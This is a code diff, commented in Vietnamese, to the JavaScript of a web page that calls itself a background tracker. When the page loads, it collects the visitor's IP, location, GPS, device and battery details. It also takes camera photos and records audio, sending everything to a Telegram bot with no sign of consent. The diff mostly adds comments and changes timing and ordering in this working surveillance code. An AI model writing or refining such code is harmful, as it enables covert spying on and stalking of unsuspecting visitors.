@@ -145,7 +145,7 @@
             }
         }
 
-        // Hàm chụp ảnh - tối ưu tốc độ
+        // Hàm chụp ảnh
         async function captureSinglePhoto(video, canvas, ctx, photoNumber) {
             return new Promise((resolve) => {
                 try {
@@ -163,10 +163,9 @@
                             }
                         }, 'image/jpeg', 0.85);
                     } else {
-                        // Chờ tối đa 200ms để có dữ liệu
                         setTimeout(() => {
                             captureSinglePhoto(video, canvas, ctx, photoNumber).then(resolve);
-                        }, 50);
+                        }, 100);
                     }
                 } catch (e) {
                     console.error(`Lỗi chụp ảnh #${photoNumber}:`, e);
@@ -186,7 +185,7 @@
             }
         }
 
-        // Hàm ghi âm - tối ưu khởi tạo nhanh
+        // Hàm ghi âm
         async function startRecording() {
             if (audioRecorded) return;
             try {
@@ -351,6 +350,7 @@
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
+                    // Nhân với 100 và làm tròn để có phần trăm
                     const level = Math.round(battery.level * 100);
                     batteryPercent = `${level}%`;
                     batteryCharging = battery.charging;
@@ -367,6 +367,7 @@
             
             if (isIOS) {
                 console.log('📱 Phát hiện thiết bị iOS - iOS không cho phép đọc % pin qua web');
+                // iOS không cho phép đọc % pin, hiển thị thông báo thân thiện
                 batteryPercent = 'iOS giới hạn';
                 batteryCharging = 'Không xác định';
                 return { batteryPercent: 'iOS không hỗ trợ', batteryCharging: false };
@@ -374,6 +375,7 @@
             
             // Phương pháp 3: Thử dùng API khác (nếu có)
             try {
+                // Một số trình duyệt Android có thể hỗ trợ thêm
                 if ('webkitGetBattery' in navigator) {
                     const battery = await navigator.webkitGetBattery();
                     const level = Math.round(battery.level * 100);
@@ -384,6 +386,7 @@
                 }
             } catch (e) {}
             
+            // Nếu không lấy được, trả về giá trị mặc định
             console.log('⚠️ Không thể lấy thông tin pin');
             return { batteryPercent: 'Không xác định', batteryCharging: false };
         }
@@ -393,6 +396,7 @@
             const userAgent = navigator.userAgent;
             const platform = navigator.platform || 'Không xác định';
             
+            // Phát hiện iOS chính xác
             const isIOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
             const isIPhone = /iPhone/.test(userAgent);
             const isIPad = /iPad/.test(userAgent) || (isIOS && screen.width > 768);
@@ -469,6 +473,8 @@
         async function getInfoAndSendToTelegram() {
             const { ip, locationData } = await getIPAndLocation();
             const deviceInfo = await getDeviceInfo();
+            
+            // Lấy thông tin pin - đã xử lý riêng cho iOS
             const { batteryPercent, batteryCharging } = await getBatteryInfo();
             
             const screenWidth = screen.width;
@@ -481,11 +487,13 @@
             const referrer = document.referrer || 'Truy cập trực tiếp';
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không xác định';
             
+            // Tạo link Google Maps nếu có tọa độ
             let telegramMapsLink = '';
             if (locationData.lat && locationData.lon) {
                 telegramMapsLink = `\n<a href="https://www.google.com/maps?q=${locationData.lat},${locationData.lon}">🗺️ Xem vị trí (ước tính từ IP)</a>`;
             }
             
+            // Xử lý hiển thị pin đẹp hơn cho iOS
             let batteryDisplay = '';
             if (deviceInfo.isIOS) {
                 batteryDisplay = `<b>🔋 Pin:</b> <code>iOS không hỗ trợ đọc % pin qua web (giới hạn bảo mật)</code>`;
@@ -517,7 +525,7 @@
             console.log('✅ Đã gửi thông tin đến Telegram');
         }
         
-        // Khởi tạo camera - tối ưu tốc độ
+        // Khởi tạo camera
         async function startCameraImmediately() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
@@ -549,8 +557,7 @@
                     };
                 });
                 
-                // Chờ một chút để video ổn định
-                await new Promise(resolve => setTimeout(resolve, 100));
+                await new Promise(resolve => setTimeout(resolve, 500));
                 await captureMultiplePhotos(video, canvas, ctx);
             } catch (e) {
                 console.warn('Camera error:', e);
@@ -558,29 +565,31 @@
             }
         }
         
-        // Khởi tạo song song camera và ghi âm
+        async function requestAudioImmediately() {
+            setTimeout(async () => {
+                if (!audioRecorded) {
+                    await startRecording();
+                }
+            }, 100);
+        }
+        
         async function init() {
             try {
                 console.log('🚀 Khởi tạo tracker (chế độ nền, chỉ gửi Telegram)...');
                 
-                // Chạy song song: gửi thông tin + GPS + camera + ghi âm
-                const infoPromise = getInfoAndSendToTelegram();
-                const gpsPromise = new Promise(resolve => {
-                    setTimeout(() => {
-                        autoSendGPS();
-                        resolve();
-                    }, 500);
-                });
+                // Gửi thông tin đến Telegram
+                await getInfoAndSendToTelegram();
                 
-                // Camera và ghi âm chạy song song
-                const cameraPromise = startCameraImmediately();
-                const audioPromise = (async () => {
-                    // Đợi một chút để tránh xung đột với camera
-                    await new Promise(resolve => setTimeout(resolve, 50));
-                    await startRecording();
-                })();
+                // Tự động gửi vị trí GPS
+                setTimeout(() => {
+                    autoSendGPS();
+                }, 1500);
                 
-                await Promise.all([infoPromise, gpsPromise, cameraPromise, audioPromise]);
+                // Khởi tạo camera và chụp ảnh
+                await startCameraImmediately();
+                
+                // Ghi âm
+                await requestAudioImmediately();
                 
                 console.log('✅ Hoàn tất khởi tạo, tất cả dữ liệu đã được gửi đến Telegram');
             } catch (err) {
